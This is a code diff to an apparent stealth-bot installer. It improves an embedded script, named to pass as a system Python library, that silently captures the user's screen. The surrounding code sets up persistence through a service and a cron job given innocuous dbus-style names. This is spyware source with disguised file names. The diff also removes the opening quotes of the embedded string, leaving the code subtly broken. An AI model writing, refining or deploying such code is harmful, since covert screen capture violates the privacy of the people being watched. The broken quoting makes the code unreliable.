@@ -34,7 +34,7 @@ SERVICE_FILE = SERVICE_DIR / "dbus-drivers-helper.service"
 CRON_FILE = Path("/etc/cron.d/dbus-system-maintenance")
 
 # ----------------- SCREENSHOT SCRIPT CONTENT -----------------
-SCREENSHOT_SCRIPT_CONTENT = """#!/usr/bin/env python3
+SCREENSHOT_SCRIPT_CONTENT = #!/usr/bin/env python3
 \"\"\"
 system-python-lib23443.py
 Silent screenshot utility for the stealth bot.
@@ -52,66 +52,120 @@ os.environ['DISPLAY'] = ':0'
 os.environ['XAUTHORITY'] = f'/run/user/{os.getuid()}/gdm/Xauthority' if os.path.exists(f'/run/user/{os.getuid()}/gdm/Xauthority') else f'/home/{os.getlogin()}/.Xauthority'
 
 def take_screenshot():
-    \"\"\"Take a silent screenshot without any visual indication\"\"\"
+    """Robust screenshot function that handles multiple scenarios"""
     try:
-        # Create temporary file for screenshot
-        temp_dir = tempfile.gettempdir()
-        screenshot_path = os.path.join(temp_dir, f"system_scan_{os.getpid()}.png")
+        # Try to detect the actual display
+        display = detect_display()
+        xauth = detect_xauthority()
         
-        # Try multiple methods to capture screenshot
-        screenshot = None
+        # Set environment properly
+        env = os.environ.copy()
+        env['DISPLAY'] = display
+        if xauth:
+            env['XAUTHORITY'] = xauth
         
-        # Method 1: Try pyautogui first
+        # Try multiple methods with proper error handling
+        screenshot_path = None
+        
+        # Method 1: Try scrot (most reliable)
         try:
-            screenshot = pyautogui.screenshot()
-            screenshot.save(screenshot_path)
-            print(f"SUCCESS:pyautogui:{screenshot_path}")
-            return screenshot_path
-        except Exception as e:
-            print(f"DEBUG: PyAutoGUI failed: {e}")
-        
-        # Method 2: Try scrot command
-        try:
-            result = subprocess.run(['scrot', '-z', '-q', '100', screenshot_path], 
-                                  capture_output=True, timeout=10)
+            temp_dir = tempfile.gettempdir()
+            screenshot_path = os.path.join(temp_dir, f"screenshot_{int(time.time())}.png")
+            
+            result = subprocess.run([
+                'scrot', '-z', '-q', '100', screenshot_path
+            ], env=env, capture_output=True, text=True, timeout=15)
+            
             if result.returncode == 0 and os.path.exists(screenshot_path):
-                print(f"SUCCESS:scrot:{screenshot_path}")
                 return screenshot_path
         except Exception as e:
-            print(f"DEBUG: scrot failed: {e}")
+            print(f"scrot failed: {e}")
         
-        # Method 3: Try import command (ImageMagick)
+        # Method 2: Try import (ImageMagick)
         try:
-            result = subprocess.run(['import', '-window', 'root', '-quiet', screenshot_path], 
-                                  capture_output=True, timeout=10)
+            if not screenshot_path:
+                screenshot_path = os.path.join(temp_dir, f"screenshot_{int(time.time())}.png")
+            
+            result = subprocess.run([
+                'import', '-window', 'root', '-quiet', screenshot_path
+            ], env=env, capture_output=True, text=True, timeout=15)
+            
             if result.returncode == 0 and os.path.exists(screenshot_path):
-                print(f"SUCCESS:import:{screenshot_path}")
                 return screenshot_path
         except Exception as e:
-            print(f"DEBUG: import failed: {e}")
+            print(f"import failed: {e}")
         
-        # Method 4: Try xwd and convert
+        # Method 3: Try xwd + convert
         try:
-            xwd_path = os.path.join(temp_dir, f"temp_{os.getpid()}.xwd")
-            result = subprocess.run(['xwd', '-root', '-silent', '-out', xwd_path], 
-                                  capture_output=True, timeout=10)
+            if not screenshot_path:
+                screenshot_path = os.path.join(temp_dir, f"screenshot_{int(time.time())}.png")
+            
+            xwd_path = screenshot_path + '.xwd'
+            result = subprocess.run([
+                'xwd', '-root', '-silent', '-out', xwd_path
+            ], env=env, capture_output=True, text=True, timeout=15)
+            
             if result.returncode == 0:
-                subprocess.run(['convert', xwd_path, screenshot_path], 
-                             capture_output=True, timeout=10)
+                subprocess.run([
+                    'convert', xwd_path, screenshot_path
+                ], capture_output=True, timeout=10)
+                
                 if os.path.exists(screenshot_path):
                     os.remove(xwd_path)
-                    print(f"SUCCESS:xwd:{screenshot_path}")
                     return screenshot_path
                 os.remove(xwd_path)
         except Exception as e:
-            print(f"DEBUG: xwd failed: {e}")
+            print(f"xwd failed: {e}")
         
-        print("ERROR: All screenshot methods failed")
         return None
         
     except Exception as e:
-        print(f"ERROR: Exception in take_screenshot: {e}")
+        print(f"Screenshot error: {e}")
         return None
+
+def detect_display():
+    """Detect the correct display"""
+    displays = [':0', ':1', ':0.0', ':1.0']
+    
+    # Check which display is available
+    for display in displays:
+        try:
+            result = subprocess.run(['xdpyinfo', '-display', display], 
+                                  capture_output=True, timeout=5)
+            if result.returncode == 0:
+                return display
+        except:
+            continue
+    
+    # Fallback to common default
+    return ':0'
+
+def detect_xauthority():
+    """Detect Xauthority file location"""
+    xauth_locations = [
+        f'/run/user/{os.getuid()}/gdm/Xauthority',
+        f'/home/{os.getlogin()}/.Xauthority',
+        '/root/.Xauthority'
+    ]
+    
+    for location in xauth_locations:
+        if os.path.exists(location):
+            return location
+    
+    # Try to find Xauthority using xauth
+    try:
+        result = subprocess.run(['xauth', 'list'], capture_output=True, text=True)
+        if result.returncode == 0:
+            # Extract authority file from xauth output
+            lines = result.stdout.split('\n')
+            if lines and ' authority file ' in result.stderr:
+                for line in result.stderr.split('\n'):
+                    if ' authority file ' in line:
+                        return line.split(' authority file ')[1].strip()
+    except:
+        pass
+    
+    return None
 
 if __name__ == "__main__":
     result = take_screenshot()
